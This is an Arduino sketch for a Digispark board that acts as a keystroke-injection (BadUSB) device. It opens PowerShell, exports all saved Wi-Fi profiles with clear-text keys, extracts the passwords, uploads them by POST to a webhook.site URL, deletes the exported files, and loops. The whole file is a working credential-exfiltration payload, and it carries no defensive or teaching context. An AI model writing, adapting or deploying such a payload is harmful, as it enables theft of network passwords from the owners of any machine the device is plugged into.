#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); // LED on Model A
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0); // Initialize the keyboard
  DigiKeyboard.delay(2000);      // Wait for 2 seconds
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Press Win + R to open the Run dialog
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell"); // Start PowerShell
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Start-Sleep -Milliseconds 500"); // Introduce a short delay to ensure the commands work smoothly
  DigiKeyboard.println("cd $env:TEMP"); // Change to the temporary directory
  DigiKeyboard.delay(300);
  DigiKeyboard.println("netsh wlan export profile key=clear"); // Export Wi-Fi profiles and keys to the temp folder
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS.txt"); // Extract Wi-Fi passwords into a text file
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Invoke-WebRequest -Uri https://webhook.site/ff0960ae-6030-431f-a0c0-025f045002f1 -Method POST -InFile Wi-Fi-PASS.txt"); // Send the extracted passwords to the specified webhook URL
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Remove-Item Wi-*.xml -Force"); // Clean up the temporary files
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit"); // Exit PowerShell
  DigiKeyboard.delay(100);
  digitalWrite(1, HIGH); // Turn on the LED when the program finishes
  DigiKeyboard.delay(90000); // Delay for 90 seconds
  digitalWrite(1, LOW); // Turn off the LED
  DigiKeyboard.delay(5000); // Wait for 5 seconds before repeating the loop
}
